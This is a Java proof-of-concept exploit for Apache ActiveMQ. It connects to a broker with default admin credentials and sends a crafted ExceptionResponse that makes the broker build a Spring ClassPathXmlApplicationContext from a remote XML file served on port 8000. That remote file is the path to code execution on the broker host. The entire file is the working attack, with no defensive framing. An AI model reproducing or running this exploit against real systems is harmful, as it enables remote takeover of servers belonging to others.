package org.example;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.ActiveMQSession;
import org.apache.activemq.command.ExceptionResponse;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.*;

public class Main {
    public static void main(String[] args) throws Exception {
        ConnectionFactory connectionFactory = new
            ActiveMQConnectionFactory("tcp://localhost:61616");

        Connection connection = connectionFactory.createConnection("admin", "admin");
        connection.start();
        ActiveMQSession session = (ActiveMQSession) connection.createSession();
        ExceptionResponse exceptionResponse = new ExceptionResponse();

        exceptionResponse.setException(new ClassPathXmlApplicationContext("http://127.0.0.1:8000/1.xml"));

        session.syncSendPacket(exceptionResponse);

        connection.close();
    }
}